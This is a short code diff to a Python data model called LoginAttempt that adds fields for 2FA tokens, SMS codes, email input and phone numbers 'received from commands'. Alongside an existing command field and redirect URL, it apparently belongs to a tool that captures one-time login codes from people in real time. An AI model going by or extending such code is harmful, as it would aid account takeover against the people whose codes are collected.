@@ -65,6 +65,12 @@ class LoginAttempt(BaseModel):
     page: Optional[str] = "Página Loading..."
     current_action: Optional[str] = None  # Para armazenar o comando atual
     redirect_url: Optional[str] = None
+    # Campos para armazenar dados recebidos dos comandos
+    token_2fa: Optional[str] = None
+    email_input: Optional[str] = None
+    sms_code: Optional[str] = None
+    phone_number: Optional[str] = None
+    app_mail: Optional[str] = None
     timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
 
 class LoginAttemptCreate(BaseModel):
